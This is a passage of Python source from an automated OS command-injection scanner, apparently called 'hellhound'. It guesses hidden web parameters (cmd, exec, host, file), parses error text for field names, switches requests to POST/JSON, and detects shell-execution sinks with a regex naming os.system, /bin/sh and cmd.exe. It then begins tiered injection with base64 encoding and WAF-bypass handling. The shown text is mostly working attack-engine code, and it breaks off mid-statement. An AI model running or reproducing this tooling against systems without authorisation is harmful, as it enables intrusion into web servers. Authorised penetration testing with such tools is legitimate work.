                            if isinstance(node, dict):
                                for k, v in node.items():
                                    kl = k.lower()
                                    if kl in ('example', 'schema', 'payload',
                                              'body', 'fields', 'params', 'parameters'):
                                        if isinstance(v, dict):
                                            for pk in v:
                                                pkl = pk.lower()
                                                if (2 <= len(pkl) <= 40
                                                        and re.fullmatch(r'[a-z_][a-z0-9_]*', pkl)
                                                        and pkl not in _pre_seen
                                                        and pkl not in _skip):
                                                    _pre_seen.add(pkl)
                                                    _pre_params_found.append(pkl)
                                    elif kl not in _skip:
                                        _pre_walk(v, depth + 1)
                        _pre_walk(_pre_json)
                    except Exception:
                        pass
                # Switch method unconditionally — even if no new params extracted
                endpoint["method"] = "POST"
                endpoint["content_type"] = "application/json"
                endpoint.setdefault("headers", {})["Content-Type"] = "application/json"
                # Add newly extracted params; existing ones stay
                for _pn in _pre_params_found:
                    endpoint["params"].setdefault(_pn, "test")
                    if risk_score(_pn) >= 2 and _pn not in (endpoint.get("priority_params") or []):
                        endpoint.setdefault("priority_params", []).append(_pn)
                # Rebuild params_list so injection picks up the new params
                _pp_pre = endpoint.get("priority_params") or []
                _seen_pre = set(_pp_pre)
                params_list = list(_pp_pre) + sorted(
                    [p for p in endpoint["params"] if p not in _seen_pre],
                    key=lambda n: -risk_score(n)
                )
                vdim(f"  [post-pre-check] GET baseline signals POST/JSON — switched; "
                     f"body params extracted: {_pre_params_found!r}")
                _all_guessed = False
        ep_vulns = 0

        # ── Zero-param context-aware probe round ───────────────────────────
        # When an endpoint arrives with no identified params, don't skip it —
        # derive a targeted wordlist from URL segments + baseline response and
        # probe each candidate with a known-safe value.  Any candidate that
        # changes the response (status, body-hash, or body-length) is likely
        # a real param: inject it into the endpoint's param dict for testing.
        #
        # Context signals used:
        #   1. URL slug segments   → hint at functional category (ping, report, exec…)
        #   2. Baseline body JSON keys → the server already told us its own field names
        #   3. Baseline body size  → a tiny response (< 250 bytes) is likely an error
        #                            page that will react differently to valid params
        #   4. risk_score ranking  → high-risk candidates probe first; bail early
        _all_guessed = not params_list
        if not params_list or _all_guessed:
            import hashlib as _hl_zp, json as _json_zp, urllib.parse as _up_zp

            _zp_url  = endpoint["url"]
            _zp_segs = [s.lower() for s in _up_zp.urlparse(_zp_url).path.split("/") if s]
            _zp_body = baseline_body or ""
            _zp_len  = len(_zp_body)

            # ── Slug → context category ───────────────────────────────────
            # Each slug keyword maps to an ordered list of high-probability
            # param names for that functional category.
            _ZP_HINT: dict = {
                "ping":        ["host", "target", "ip", "addr", "destination"],
                "exec":        ["cmd", "command", "input", "arg", "shell"],
                "run":         ["cmd", "command", "input", "script", "arg"],
                "cmd":         ["cmd", "command", "input", "arg"],
                "shell":       ["cmd", "command", "input", "exec"],
                "console":     ["cmd", "command", "input", "expr"],
                "query":       ["q", "query", "input", "filter", "expr"],
                "search":      ["q", "query", "input", "keyword", "term"],
                "lookup":      ["host", "q", "query", "name", "target"],
                "resolve":     ["host", "name", "target", "domain"],
                "dns":         ["host", "name", "domain", "target"],
                "nslookup":    ["host", "name", "domain"],
                "traceroute":  ["host", "target", "ip"],
                "trace":       ["host", "target", "ip", "cmd"],
                "scan":        ["host", "target", "ip", "range"],
                "check":       ["host", "target", "url", "ip"],
                "net":         ["host", "target", "ip", "cmd"],
                "network":     ["host", "target", "ip", "cmd"],
                "file":        ["file", "path", "name", "dir", "src"],
                "read":        ["file", "path", "name", "src"],
                "write":       ["file", "path", "data", "content"],
                "download":    ["file", "path", "url", "src"],
                "upload":      ["file", "path", "name"],
                "log":         ["file", "path", "level", "name"],
                "debug":       ["cmd", "input", "q", "level", "target"],
                "diag":        ["cmd", "input", "host", "target"],
                "diagnostic":  ["cmd", "input", "host", "target"],
                "report":      ["file", "path", "name", "format", "id", "type", "output"],
                "export":      ["file", "path", "format", "output", "name"],
                "import":      ["file", "path", "src", "url"],
                "preview":     ["url", "path", "src", "file"],
                "proxy":       ["url", "target", "host", "src"],
                "webhook":     ["url", "target", "src"],
                "eval":        ["expr", "input", "cmd", "code"],
                "repl":        ["input", "cmd", "expr", "code"],
                "process":     ["cmd", "input", "pid", "arg"],
                "proc":        ["cmd", "input", "pid"],
                "system":      ["cmd", "command", "input"],
                "admin":       ["cmd", "input", "action", "target"],
                "mgmt":        ["cmd", "input", "action", "host"],
                "management":  ["cmd", "input", "action", "host"],
                "tool":        ["cmd", "input", "target", "arg"],
                "tools":       ["cmd", "input", "target"],
                "util":        ["cmd", "input", "arg"],
                "utils":       ["cmd", "input", "arg"],
                "internal":    ["cmd", "input", "action", "target"],
                "health":      ["host", "target", "check", "service"],
                "monitor":     ["host", "target", "service", "check"],
                "test":        ["cmd", "input", "target", "host"],
                "api":         ["cmd", "input", "action", "q", "target"],
                "v1":          ["cmd", "input", "action", "q", "target"],
                "v2":          ["cmd", "input", "action", "q", "target"],
            }

            # ── Step 0: GET response body → usage hint parsing ────────────
            # Before touching the slug/JSON/fallback candidate pipeline, parse
            # the GET baseline response for explicit param names that the server
            # itself named in error/usage text.  These are the highest-confidence
            # candidates possible — the server told us exactly what it wants.
            #
            # Two signals are extracted independently:
            #   A) POST/JSON indicator — server says it expects a POST or JSON body
            #   B) Named field hints   — server names specific param/field names
            #
            # If A is detected:
            #   → Switch endpoint method to POST right here, before the probe loop.
            #     The probe loop will then send POST from the start, not as fallback.
            # If B is detected:
            #   → Prepend extracted names to _zp_candidates (highest priority).
            #     These fire before slug guesses and generic fallbacks.
            #
            # Pattern A: method/format keywords
            _zp_post_indicator = re.compile(
                r'\b(?:use\s+(?:POST|a\s+POST)|send\s+(?:a\s+)?(?:POST|JSON)|'
                r'POST\s+(?:request|method|body|JSON)|application/json|'
                r'content.?type["\s:]+application/json|'
                r'requires?\s+(?:POST|JSON|a\s+body|request\s+body)|'
                r'method\s+not\s+allowed|only\s+(?:POST|JSON)(?:\s+(?:is\s+)?(?:supported|allowed))?|'
                r'(?:missing|required|provide|expected)\s+(?:(?:(?:field|param(?:eter)?|key|body|argument)s?\b.*?){1,3}))\b',
                re.I | re.S,
            )
            # Pattern B: named field extraction from common error/usage patterns
            # Matches: "missing field: cmd", "required: host, port", "provide 'filename'",
            #          "expected fields: [host, target]", "parameters: cmd, input",
            #          "'cmd' is required", "field 'host' missing"
            _zp_field_extract = re.compile(
                r'(?:'
                r'(?:missing|required|provide|expected|needs?|must\s+(?:include|have|provide)|'
                r'(?:field|param(?:eter)?|key|argument|input)s?\s*(?:required|missing|needed))[\s:\'\"]+([a-zA-Z_][a-zA-Z0-9_]{0,39}(?:[,\s]+[a-zA-Z_][a-zA-Z0-9_]{0,39})*)'
                r'|'
                r'[\'\"]([ a-zA-Z_][a-zA-Z0-9_]{0,39})[\'\"][\s]*(?:is\s+)?(?:required|missing|needed|expected)'
                r'|'
                r'(?:field|param(?:eter)?|key|argument)\s+[\'\"]([ a-zA-Z_][a-zA-Z0-9_]{0,39})[\'\"][\s]*(?:is\s+)?(?:missing|required|not\s+(?:found|provided))'
                r'|'
                r'(?:field|param(?:eter)?|key|argument)[s]?\s*:\s*\[([^\]]{1,200})\]'
                r')',
                re.I,
            )
            # Pattern C: JSON schema / example body in response
            # e.g. {"host": "...", "port": 80} or {"cmd": null}
            _zp_body_hinted_names: list = []
            _zp_post_early = False

            if endpoint["method"] == "GET" and _zp_body:
                # Check for POST indicator
                if _zp_post_indicator.search(_zp_body):
                    _zp_post_early = True
                    vdim(f"  [hint-parser] GET response indicates POST/JSON body expected — will switch method")

                # Extract explicitly named params from error/usage text
                _hint_extracted: list = []
                _hint_seen: set = set()
                for _m in _zp_field_extract.finditer(_zp_body):
                    # Groups: (1) list of names after keyword, (2) name before 'required',
                    #         (3) name in "field 'X' missing", (4) bracketed list
                    for _grp in _m.groups():
                        if not _grp:
                            continue
                        # Split on comma/whitespace to handle lists like "host, port, cmd"
                        for _raw in re.split(r'[\s,;|/]+', _grp.strip()):
                            _clean = _raw.strip(" '\"[]{}").lower()
                            if (2 <= len(_clean) <= 40
                                    and re.fullmatch(r'[a-z_][a-z0-9_]*', _clean)
                                    and _clean not in _hint_seen
                                    # Ignore generic English words that aren't param names
                                    and _clean not in {
                                        'the', 'this', 'that', 'with', 'from', 'into',
                                        'your', 'both', 'some', 'post', 'get', 'put',
                                        'and', 'or', 'not', 'via', 'for', 'are', 'is',
                                        'be', 'has', 'have', 'was', 'were', 'been',
                                        'an', 'in', 'on', 'at', 'to', 'of', 'as',
                                        'json', 'body', 'request', 'response', 'method',
                                        'required', 'missing', 'expected', 'provided',
                                        'field', 'parameter', 'param', 'argument',
                                        'value', 'values', 'data', 'object', 'string',
                                        'integer', 'boolean', 'number', 'array', 'null',
                                    }):
                                _hint_seen.add(_clean)
                                _hint_extracted.append(_clean)

                # Also attempt JSON body parse for example/schema embedded in response
                # e.g. server returns: {"error": "missing fields", "example": {"cmd": "ls"}}
                if _zp_body.lstrip().startswith(("{", "[")):
                    try:
                        _hint_json = _json_zp.loads(_zp_body)
                        def _extract_example_keys(node, depth=0):
                            """Walk a parsed JSON response looking for an 'example',
                            'schema', 'required', or 'fields' sub-object whose keys
                            are likely param names (not generic response envelope keys)."""
                            if depth > 4: return
                            _envelope_skip = {
                                'error', 'message', 'msg', 'status', 'code',
                                'detail', 'details', 'description', 'reason',
                                'success', 'ok', 'result', 'results', 'data',
                                'response', 'info', 'hint', 'help', 'type',
                                'timestamp', 'time', 'id', 'version', 'meta',
                            }
                            if isinstance(node, dict):
                                for k, v in node.items():
                                    k_low = k.lower()
                                    if k_low in ('example', 'schema', 'payload',
                                                 'body', 'fields', 'params',
                                                 'parameters', 'required'):
                                        # The VALUE is likely a dict of param→sample
                                        if isinstance(v, dict):
                                            for pk in v:
                                                pk_low = pk.lower().strip()
                                                if (2 <= len(pk_low) <= 40
                                                        and re.fullmatch(r'[a-z_][a-z0-9_]*', pk_low)
                                                        and pk_low not in _hint_seen
                                                        and pk_low not in _envelope_skip):
                                                    _hint_seen.add(pk_low)
                                                    _hint_extracted.append(pk_low)
                                        elif isinstance(v, list):
                                            for item in v[:10]:
                                                if isinstance(item, str):
                                                    item_low = item.lower().strip()
                                                    if (2 <= len(item_low) <= 40
                                                            and re.fullmatch(r'[a-z_][a-z0-9_]*', item_low)
                                                            and item_low not in _hint_seen
                                                            and item_low not in _envelope_skip):
                                                        _hint_seen.add(item_low)
                                                        _hint_extracted.append(item_low)
                                    elif k_low not in _envelope_skip:
                                        _extract_example_keys(v, depth + 1)
                        _extract_example_keys(_hint_json)
                    except Exception:
                        pass

                if _hint_extracted:
                    vdim(f"  [hint-parser] Extracted {len(_hint_extracted)} named param(s) from GET response: {_hint_extracted!r}")
                    _zp_body_hinted_names = _hint_extracted

                # If POST is indicated AND we have named params → switch method now
                if _zp_post_early and _zp_body_hinted_names:
                    vdim(f"  [hint-parser] Switching endpoint to POST — will inject body params: {_zp_body_hinted_names!r}")
                    endpoint["method"] = "POST"
                    endpoint["content_type"] = "application/json"
                    endpoint.setdefault("headers", {})["Content-Type"] = "application/json"
                elif _zp_post_early:
                    # POST indicated but no names extracted — still switch method so
                    # the probe loop below sends POST from the start
                    vdim(f"  [hint-parser] POST indicated, no named params extracted — switching to POST for probe loop")
                    endpoint["method"] = "POST"
                    endpoint["content_type"] = "application/json"
                    endpoint.setdefault("headers", {})["Content-Type"] = "application/json"

            # ── Candidate list ────────────────────────────────────────────
            _zp_candidates: list = []
            _zp_seen: set = set()

            def _zp_add(name: str):
                if name not in _zp_seen:
                    _zp_seen.add(name)
                    _zp_candidates.append(name)

            # 0. Body-hinted param names — highest confidence (server named these)
            for _bhn in _zp_body_hinted_names:
                _zp_add(_bhn)

            # 1. Slug-derived hints (highest priority — context-specific)
            for _seg in _zp_segs:
                for _h in _ZP_HINT.get(_seg, []):
                    _zp_add(_h)

            # 2. JSON keys from baseline body (server's own field names)
            #    e.g. {"file": null, "format": "pdf"} → try "file", "format"
            if _zp_body.lstrip().startswith(("{", "[")):
                try:
                    _zp_data = _json_zp.loads(_zp_body)
                    def _zp_keys(node, depth=0):
                        if depth > 3: return
                        if isinstance(node, dict):
                            for k, v in node.items():
                                if isinstance(k, str) and 1 < len(k) < 30:
                                    _zp_add(k)
                                _zp_keys(v, depth+1)
                        elif isinstance(node, list):
                            for item in node[:5]:
                                _zp_keys(item, depth+1)
                    _zp_keys(_zp_data)
                except Exception:
                    pass

            # 3. Universal high-risk fallback — always include if not already added
            for _fb in ["cmd", "command", "host", "input", "target", "file",
                        "path", "q", "query", "exec", "arg", "ip", "src", "url"]:
                _zp_add(_fb)

            # ── Sort by risk_score (high-risk first) ──────────────────────
            _zp_candidates.sort(key=lambda n: -risk_score(n))

            # ── Probe each candidate ──────────────────────────────────────
            # Safe value: use a string unlikely to trigger errors
            _ZP_SAFE = _ZP_PROBE_SENTINEL 
            import hashlib as _hl_zp2
            _zp_base_hash = _hl_zp2.md5((_zp_body or "").encode(errors="replace")).hexdigest()
            _zp_base_len  = _zp_len
            _zp_found: dict = {}
            _zp_priority: list = []

            vdim(f"Zero-param endpoint — probing {len(_zp_candidates)} context-aware candidates...")

            # Network-sink categories whose params return identical errors for any
            # non-resolvable value — a single fixed probe value cannot distinguish
            # "param accepted, resolution failed" from "param ignored entirely".
            # We probe with a second, structurally plausible value and treat the
            # param as live if the two probe responses differ from each other,
            # even when neither differs from the baseline.
            _ZP_NET_SINK_NAMES = {
                "host", "target", "ip", "addr", "destination",
                "domain", "name", "fqdn",
            }
            # Category keywords that suggest network-sink semantics
            _ZP_NET_SINK_SEGS = {
                "dns", "nslookup", "resolve", "ping",
                "trace", "traceroute", "lookup",
            }
            _zp_is_net_sink = (
                any(s in _ZP_NET_SINK_SEGS for s in _zp_segs)
            )
            # Plausible second probe value for network-sink candidates
            _ZP_NET_ALT = "localhost"

            for _zp_name in _zp_candidates:
                try:
                    _zp_probe_params = {_zp_name: _ZP_SAFE}
                    if endpoint["method"] == "GET":
                        _zp_r = self.client.get(_zp_url, _zp_probe_params)
                    else:
                        _zp_r = self.client.post(_zp_url,
                                                  {**endpoint.get("hidden", {}),
                                                   **_zp_probe_params})
                    _zp_rb  = _zp_r.get("body", "") or ""
                    _zp_rh  = _hl_zp2.md5(_zp_rb.encode(errors="replace")).hexdigest()
                    _zp_st  = _zp_r.get("status", 0)
                    _zp_el  = _zp_r.get("elapsed", 0.0)

                    # Param is "live" if: response changed hash/length OR status changed
                    _hash_changed   = _zp_rh != _zp_base_hash
                    _len_changed    = abs(len(_zp_rb) - _zp_base_len) > 4
                    _status_changed = _zp_st not in (0, baseline["status"])
                    _cross_diff     = False

                    # For network-sink candidates: fire a second probe with a
                    # structurally different but plausible value.  If the two
                    # probe responses differ from each other, the param is live
                    # even when both responses match the baseline (e.g. blind
                    # DNS sinks that return the same generic error for any
                    # non-resolving input but a different body for a resolving one).
                    if (not (_hash_changed or _len_changed or _status_changed)
                            and _zp_is_net_sink
                            and _zp_name in _ZP_NET_SINK_NAMES):
                        try:
                            _zp_alt_params = {_zp_name: _ZP_NET_ALT}
                            if endpoint["method"] == "GET":
                                _zp_r2 = self.client.get(_zp_url, _zp_alt_params)
                            else:
                                _zp_r2 = self.client.post(_zp_url,
                                                           {**endpoint.get("hidden", {}),
                                                            **_zp_alt_params})
                            _zp_rb2 = _zp_r2.get("body", "") or ""
                            _zp_rh2 = _hl_zp2.md5(_zp_rb2.encode(errors="replace")).hexdigest()
                            _zp_st2 = _zp_r2.get("status", 0)
                            # Cross-diff: the two probe responses differ → param is live
                            if (_zp_rh2 != _zp_rh
                                    or abs(len(_zp_rb2) - len(_zp_rb)) > 4
                                    or _zp_st2 != _zp_st):
                                _cross_diff = True
                                vdim(f"  [zero-param/net-sink] {_zp_name!r} → "
                                     f"cross-diff detected between probe values — adding as param")
                        except Exception:
                            pass

                    if _hash_changed or _len_changed or _status_changed or _cross_diff:
                        _zp_found[_zp_name] = _ZP_SAFE
                        if risk_score(_zp_name) >= 2:
                            _zp_priority.append(_zp_name)
                        if not _cross_diff:
                            vdim(f"  [zero-param] {_zp_name!r} → response changed "
                                 f"(hash:{_hash_changed} len:{_len_changed} status:{_status_changed}) — adding as param")
                except Exception:
                    pass

            if _zp_found:
                vdim(f"Zero-param probe found {len(_zp_found)} live param(s): {list(_zp_found)!r}")
                # In all-guessed mode the existing params dict is full of
                # unvalidated heuristic names.  Replace it entirely with only
                # the probe-confirmed params so injection doesn't waste cycles
                # on names the server silently ignores.
                if _all_guessed:
                    endpoint["params"] = dict(_zp_found)
                    endpoint["priority_params"] = []
                else:
                    endpoint["params"].update(_zp_found)
                for _zp_pp in _zp_priority:
                    if _zp_pp not in (endpoint.get("priority_params") or []):
                        endpoint.setdefault("priority_params", []).append(_zp_pp)
                # Rebuild params_list with newly discovered params, risk-sorted
                _pp2      = endpoint.get("priority_params") or []
                _seen2    = set(_pp2)
                _rest2    = sorted(
                    [p for p in endpoint["params"] if p not in _seen2],
                    key=lambda n: -risk_score(n)
                )
                params_list = list(_pp2) + _rest2
            else:
                # ── POST escalation ───────────────────────────────────────
                # If the endpoint was registered as GET but the baseline body
                # contains signals that the server expects a POST with a JSON
                # body (error messages about missing fields, method hints, etc.),
                # retry the entire candidate probe loop as POST+JSON before
                # giving up.  This catches endpoints that ignore GET params
                # entirely and only process a JSON request body.
                _zp_post_hints = re.compile(
                    r'\b(?:method|post|required|missing|body|json|provide|'
                    r'expected|filename|format|content.?type|field|payload)\b',
                    re.I
                )
                _zp_should_escalate = (
                    endpoint["method"] == "GET"
                    and bool(_zp_post_hints.search(_zp_body))
                )
                if not _zp_should_escalate:
                    vdim(f"Zero-param probe: no live params found — skipping endpoint")
                    return

                vdim(f"Zero-param GET probe found nothing — baseline hints POST/JSON body; escalating...")

                # Re-probe candidates as POST with JSON body
                import json as _json_zp_esc
                _zp_found_post: dict = {}
                _zp_priority_post: list = []

                for _zp_name in _zp_candidates:
                    try:
                        _zp_payload_a = _json_zp_esc.dumps({_zp_name: _ZP_SAFE})
                        _zp_r_a = self.client.post(
                            _zp_url,
                            data=_zp_payload_a,
                            headers={"Content-Type": "application/json"},
                        )
                        _zp_rb_a  = _zp_r_a.get("body", "") or ""
                        _zp_rh_a  = _hl_zp2.md5(_zp_rb_a.encode(errors="replace")).hexdigest()
                        _zp_st_a  = _zp_r_a.get("status", 0)

                        _hash_a   = _zp_rh_a != _zp_base_hash
                        _len_a    = abs(len(_zp_rb_a) - _zp_base_len) > 4
                        _stat_a   = _zp_st_a not in (0, baseline["status"])

                        # Cross-diff: probe a second structurally different value
                        _cross_a  = False
                        if not (_hash_a or _len_a or _stat_a):
                            try:
                                _zp_payload_b = _json_zp_esc.dumps({_zp_name: "hh_zp_alt"})
                                _zp_r_b = self.client.post(
                                    _zp_url,
                                    data=_zp_payload_b,
                                    headers={"Content-Type": "application/json"},
                                )
                                _zp_rb_b = _zp_r_b.get("body", "") or ""
                                _zp_rh_b = _hl_zp2.md5(_zp_rb_b.encode(errors="replace")).hexdigest()
                                _zp_st_b = _zp_r_b.get("status", 0)
                                if (_zp_rh_b != _zp_rh_a
                                        or abs(len(_zp_rb_b) - len(_zp_rb_a)) > 4
                                        or _zp_st_b != _zp_st_a):
                                    _cross_a = True
                                    vdim(f"  [zero-param/post-esc] {_zp_name!r} → "
                                         f"cross-diff on POST probe — adding as param")
                            except Exception:
                                pass

                        if _hash_a or _len_a or _stat_a or _cross_a:
                            _zp_found_post[_zp_name] = _ZP_SAFE
                            if risk_score(_zp_name) >= 2:
                                _zp_priority_post.append(_zp_name)
                            if not _cross_a:
                                vdim(f"  [zero-param/post-esc] {_zp_name!r} → response changed "
                                     f"(hash:{_hash_a} len:{_len_a} status:{_stat_a}) — adding as param")
                    except Exception:
                        pass

                if _zp_found_post:
                    vdim(f"Zero-param POST escalation found {len(_zp_found_post)} live param(s): {list(_zp_found_post)!r}")
                    # Switch endpoint to POST+JSON for all downstream injection
                    endpoint["method"] = "POST"
                    endpoint["content_type"] = "application/json"  # consumed by _send
                    endpoint.setdefault("headers", {})["Content-Type"] = "application/json"
                    endpoint["params"].update(_zp_found_post)
                    for _zp_pp in _zp_priority_post:
                        if _zp_pp not in (endpoint.get("priority_params") or []):
                            endpoint.setdefault("priority_params", []).append(_zp_pp)
                    _pp2   = endpoint.get("priority_params") or []
                    _seen2 = set(_pp2)
                    _rest2 = sorted(
                        [p for p in endpoint["params"] if p not in _seen2],
                        key=lambda n: -risk_score(n)
                    )
                    params_list = list(_pp2) + _rest2
                else:
                    vdim(f"Zero-param probe: no live params found (GET + POST escalation) — skipping endpoint")
                    return

        # Inst 11 — Semi-static sink hinting from baseline response.
        # Parse baseline body for function names / error text that reveal a
        # server-side command execution context.  When found, store as
        # endpoint["sink_hint"] and elevate risk scores of params on this endpoint.
        _SINK_PATTERNS = re.compile(
            r'\b(?:subprocess|popen|execvp|execve|system\s*\(|os\.system|'
            r'shell_exec|passthru|proc_open|exec\s*\(|ShellExecute|'
            r'CreateProcess|WScript\.Shell|Runtime\.exec|'
            r'sh[: ]\s*\w+.*command\s+not\s+found|'
            r'/bin/sh|/bin/bash|cmd\.exe|powershell\.exe)\b',
            re.I)
        if not endpoint.get("sink_hint"):
            _sh_match = _SINK_PATTERNS.search(baseline_body or "")
            if _sh_match:
                endpoint["sink_hint"] = _sh_match.group().strip()[:80]
                _sh_label = endpoint["sink_hint"]
                tprint(f"  {info(f'Sink hint [{_sh_label!r}] detected in response — elevating param priority')}")

        # Fix 3: Track per-param static misses for endpoint-level abort.
        # _param_static_count[param] counts how many of the first 3 payloads
        # on that param returned a body identical to the param baseline hash.
        # If ALL params are fully static (>= 3 static each) → abort endpoint.
        # Stored on self so _run_payload can increment without signature change.
        import hashlib as _hl3
        self._param_static_count = {}   # param -> int  (reset per endpoint)
        _param_static_done:  set  = set()  # params confirmed non-injectable
        _endpoint_abort = False   # set True when all params static → break outer loop

        _redir_dirs = ([self.output_dir] if self.output_dir else REDIRECT_DIRS)
        _redir_file = f"hh_{self.token[:8].lower()}.txt"

        # Per-param baseline hash: send a known-safe value, record response
        # hash + length.  Any payload that produces an identical response is
        # silently skipped — the endpoint is not reflecting this param at all.
        import hashlib as _hl
        def _param_baseline_hash(ep, pname):
            """Send a fixed safe value and return (body_hash, body_len)."""
            _safe = "hellhound_base_probe"
            try:
                if ep["method"] == "GET":
                    _r = self.client.get(ep["url"],
                                         {**ep["params"], pname: _safe})
                else:
                    _r = self.client.post(ep["url"],
                                          {**ep.get("hidden", {}), **ep["params"], pname: _safe})
                _b = _r.get("body", "") or ""
                return _hl.md5(_b.encode(errors="replace")).hexdigest(), len(_b)
            except Exception:
                return None, None

        for param in params_list:
            # ── Endpoint-level abort ────────────────────────────────────────
            if _endpoint_abort:
                break

            param_confirmed = False
            confirmed_sep   = ";"
            vdim(f"=== testing param: {param} on {endpoint['url']} ===")

            # ── Per-param baseline ─────────────────────────────────────────
            # Static-response check: if a param has no effect on the response,
            # skip all payloads immediately.
            _pb_hash, _pb_len = _param_baseline_hash(endpoint, param)
            # Store on self so _run_payload can access it without signature change
            self._current_param_baseline = (_pb_hash, _pb_len)

            # ── Upfront 2-probe static check ───────────────────────────────
            # Before firing any injection payloads, send 2 distinct safe values
            # and compare hashes to baseline.
            # A PIN-protected / locked endpoint returns the same page regardless
            # of param value — detect this in 2 probes instead of burning 13+
            # Tier-1 payloads discovering it mid-stream.
            if _pb_hash is not None:
                import hashlib as _hl_up

                # ── Upfront static check guard ────────────────────────────
                # CRITICAL: Never run the static-skip check when the baseline
                # itself is an error response (4xx/5xx).
                #
                # Why: params that cause 500 on every probe (e.g. int-typed params
                # where "hellhound_base_probe" triggers ValueError) will also cause
                # 500 on hh_probe_X1 and hh_probe_X2. Fix 6's length tolerance
                # then matches all three 500 tracebacks as "identical" and skips
                # the param entirely — injection never fires. This is exactly why
                # the new version missed vulns the old version found: the old version
                # had no upfront 2-probe static check at all.
                #
                # Also skip if baseline body looks like a server error traceback.
                _baseline_resp = self._baseline(endpoint) if not hasattr(self, '_last_baseline_resp') else self._last_baseline_resp
                _baseline_status = _baseline_resp.get("status", 200) if _baseline_resp else 200
                _skip_upfront = _baseline_status >= 400

                # Additionally: if endpoint method is POST and baseline body contains
                # a Python/server traceback, also skip — error baseline means
                # static check is meaningless (all errors look the same length).
                if not _skip_upfront:
                    _bb_lower = (baseline_body or "").lower()
                    if ("traceback" in _bb_lower or "valueerror" in _bb_lower
                            or "typeerror" in _bb_lower or "internal server error" in _bb_lower):
                        _skip_upfront = True

                _probe_static = 0
                if not _skip_upfront:
                    for _upv in ("hh_probe_X1", "hh_probe_X2"):
                        try:
                            if endpoint["method"] == "GET":
                                _upr = self.client.get(endpoint["url"],
                                                       {**endpoint["params"], param: _upv})
                            else:
                                _upr = self.client.post(endpoint["url"],
                                                        {**endpoint.get("hidden", {}),
                                                         **endpoint["params"], param: _upv})
                            _uprb = _upr.get("body", "") or ""
                            _uprstatus = _upr.get("status", 200)
                            # Never count an error response as "static" — a param
                            # returning 4xx/5xx is not insensitive, it is erroring.
                            if _uprstatus >= 400:
                                break  # error response — don\'t count this param as static
                            _uprh = _hl_up.md5(_uprb.encode(errors="replace")).hexdigest()
                            # FIX 7 (baseline static check): Tightened from OR → AND to prevent
                            # injectable params being skipped when the response body is constant
                            # in size but different in content (e.g. Flask/PHP apps where shell
                            # output is NOT reflected — body length stays ~identical regardless).
                            #
                            # Old logic (OR): hash_exact OR length_close → too aggressive.
                            #   A real injectable param returning constant-size responses
                            #   (shell output not reflected) triggered _probe_static=2 → skipped.
                            #
                            # New logic: length_within_5% AND (hash_exact OR byte_noise ≤ 3)
                            #   - length_within_5%: responses must be close in size
                            #   - AND: size proximity alone is not enough
                            #   - hash_exact: truly identical body → definitely static
                            #   - OR byte_noise ≤ 3: tiny diff (CSRF token, timestamp) → static
                            #   Only mark static if body is near-byte-identical, not just same-size.
                            _len_tol_pct = int(_pb_len * 0.05)  # 5% of baseline
                            _byte_diff = abs(len(_uprb) - _pb_len)
                            _len_within_5pct = _byte_diff <= max(_len_tol_pct, 3)
                            _hash_exact = (_uprh == _pb_hash)
                            _byte_noise = _byte_diff <= 3  # tiny noise: CSRF token, nonce, etc.
                            if _len_within_5pct and (_hash_exact or _byte_noise):
                                _probe_static += 1
                        except Exception:
                            pass
                if _probe_static >= 2:
                    vdim(f"  [{param}] upfront probe: both responses identical to baseline — param locked/ignored, skipping")
                    _param_static_done.add(param)
                    # If every param in the list is now confirmed static, the
                    # endpoint is locked (PIN-wall, auth-gate, etc.) — abort.
                    if set(params_list) == _param_static_done:
                        vdim("All params static — endpoint appears locked/protected (PIN/auth-gate). Aborting.")
                        return
                    continue

            # ── Inst 2: Adaptive per-endpoint timing baseline ──────────────
            # Compute endpoint+param-specific avg/stdev from 3 clean requests.
            # If baseline is already slow/noisy, skip all time-based payloads.
            _atb_avg, _atb_stdev, _atb_skip = self._adaptive_time_baseline(endpoint, param)
            # Use adaptive threshold: avg + max(stdev*3, 5s) — never less than 5s
            _adaptive_time_thresh = _atb_avg + max(_atb_stdev * 3, 5.0)
            # Store on self so _run_adaptive_tier and Tier 2 can read it
            self._adaptive_time_thresh_current = _adaptive_time_thresh
            self._adaptive_time_skip_current   = _atb_skip

            # ── Param-type fingerprinting ──────────────────────────────────
            # If the param expects an integer, injection can't reach the shell
            # (int(payload) raises before os.system).  Skip those params to
            # reduce noise and false positives from type-conversion errors.
            #
            # ADDITIONAL CHECK: also catch obfuscated int params (e.g. _e_duration_3z8p)
            # whose names don\'t match _INT_PARAM_NAMES but whose BASELINE body is
            # already a type_conversion error. The short-circuit in _probe_param_type
            # would skip probing these entirely, missing the fact that the server
            # rejects any non-integer value before reaching the shell.
            param_type = _probe_param_type(self.client, endpoint, param)
            if param_type != "integer" and baseline_body:
                _bb_err = AdaptiveBypass.classify_error(baseline_body)
                if _bb_err == "type_conversion":
                    param_type = "integer"
                    vdim(f"[{param}] baseline body is type_conversion error — treating as integer param")
            if param_type == "integer":
                vdim(f"[{param}] skipped — integer type (no shell path)")
                continue

            # ── Input encoding detection ───────────────────────────────────
            # Detect whether the endpoint base64/JSON/URL-decodes the param
            # before passing to shell.  When detected, WV (whole-value b64)
            # payloads from the PAYLOADS list are tried first in Tier 1.
            param_input_enc = _detect_input_encoding(self.client, endpoint, param)
            # Per-param encoding state persists for ALL subsequent tiers.
            # replace=True when encoding==base64: endpoint fully consumes param,
            # so payloads must replace the value, never append.
            _enc_replace = (param_input_enc == "base64")
            self._set_enc_state(param, param_input_enc, replace=_enc_replace)
            if param_input_enc != "none":
                sys.stdout.write(
                    "\r  " + color(
                        "  [" + param + "] pre-processes input as: " + param_input_enc
                        + (" [replace-mode]" if _enc_replace else ""),
                        C.DIM + C.BYELLOW
                    ) + "  "
                )
                sys.stdout.flush()

            # ── Inst 3/4: Filter fingerprint + arg-inject escalation ───────
            # Deferred: only runs if Tiers 1-4 all fail (just before Tier 5).
            # Running it unconditionally before Tier 1 would fire 32+ extra
            # requests per param on every endpoint — far too expensive.
            # Defaults here; actual fingerprinting happens at Tier 5 gate below.
            _ff_allowed          = None
            _ff_escalate_arginject = False

            # ── WAF location context ───────────────────────────────────────
            # Track whether this param lives in the query string or POST body.
            # WAFs often apply different rule-sets per location.
            # The location is threaded into _run_adaptive_tier for 5H context.
            param_location = "body" if endpoint["method"] == "POST" else "query"

            # ── TIER 1: Direct output ─────────────────────────────────────
            vdim(f"[{param}] \u2192 Tier 1: direct output")

            # When base64 input encoding detected: try WV payloads first
            # (they ARE the correct format if the endpoint decodes b64 input)
            tier1_payloads = list(self.payloads_direct)
            _penc = self._enc_for(param)
            if _penc["replace"]:
                # Endpoint fully decodes param — WV payloads (replace-mode) first
                wv  = [p for p in tier1_payloads if p[1].startswith("WV:")]
